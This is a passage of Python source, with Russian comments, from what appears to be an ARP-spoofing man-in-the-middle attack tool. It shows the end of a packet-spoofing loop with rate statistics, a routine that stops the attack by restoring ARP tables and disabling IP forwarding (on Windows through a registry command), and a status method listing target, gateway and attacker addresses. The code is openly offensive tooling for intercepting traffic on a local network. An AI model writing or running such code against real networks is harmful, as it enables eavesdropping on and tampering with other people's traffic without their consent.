                                pps = self.spoof_packets_sent / duration if duration > 0 else 0
                                print(f"[*] MITM active for {duration:.1f}s, packets sent: {self.spoof_packets_sent} ({pps:.1f} pps)")
                                last_stats_time = current_time

                            time.sleep(2)  # Интервал между отправкой ARP пакетов

                        except KeyboardInterrupt:
                            print("\n[*] Interrupted by user")
                            break
                        except Exception as e:
                            print(f"[!] Error in spoofing loop: {e}")
                            # Продолжаем попытки
                            time.sleep(5)

                except Exception as e:
                    print(f"[!] Critical error in MITM attack: {e}")
                finally:
                    self.stop_attack(ip_forwarding_enabled)

            def stop_attack(self, ip_forwarding_enabled: bool = False):
                """Остановить атаку и восстановить сеть"""
                if not self.running:
                    return

                print("\n[*] Stopping MITM attack...")

                self.running = False
                self.spoofing = False

                # Даем время завершиться потоку атаки
                time.sleep(0.5)

                # Восстанавливаем ARP таблицы
                print("[*] Restoring ARP tables...")
                restore_success = False

                if platform.system() == "Windows":
                    if self.npcap_available:
                        restore_success = self.restore(self.target_ip, self.gateway_ip)
                    else:
                        print("[*] Skipping ARP restoration (Npcap not available)")
                else:
                    restore_success = self.restore(self.target_ip, self.gateway_ip)

                if restore_success:
                    print("[*] ARP tables restored successfully")
                else:
                    print("[!] Failed to restore ARP tables completely")

                # Выключаем IP forwarding
                print("[*] Disabling IP forwarding...")
                if platform.system() != "Windows":
                    disable_ip_forwarding()
                else:
                    # На Windows отключаем IP forwarding
                    try:
                        subprocess.run(
                            r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
                            '/v IPEnableRouter /t REG_DWORD /d 0 /f',
                            shell=True, check=True, timeout=5
                        )
                        print("[*] IP forwarding disabled on Windows")
                    except Exception as e:
                        print(f"[!] Failed to disable IP forwarding on Windows: {e}")

                # Выводим статистику
                duration = time.time() - self.start_time if self.start_time > 0 else 0
                print(f"[*] Attack duration: {duration:.1f} seconds")
                print(f"[*] ARP packets sent: {self.spoof_packets_sent}")
                print(f"[*] Average rate: {self.spoof_packets_sent/duration:.1f} pps" if duration > 0 else "[*] Average rate: N/A")
                print("[*] Network should be restored")

            def get_status(self) -> Dict:
                """Получить статус атаки"""
                current_time = time.time()
                duration = current_time - self.start_time if self.start_time > 0 else 0

                return {
                    "running": self.running,
                    "spoofing": self.spoofing,
                    "target_ip": self.target_ip,
                    "gateway_ip": self.gateway_ip,
                    "target_mac": self.target_mac,
                    "gateway_mac": self.gateway_mac,
                    "attacker_mac": self.attacker_mac,
                    "spoof_packets_sent": self.spoof_packets_sent,
                    "duration": duration,
                    "interface": self.interface,
                    "npcap_available": self.npcap_available,
                    "packets_per_second": self.spoof_packets_sent / duration if duration > 0 else 0
                }
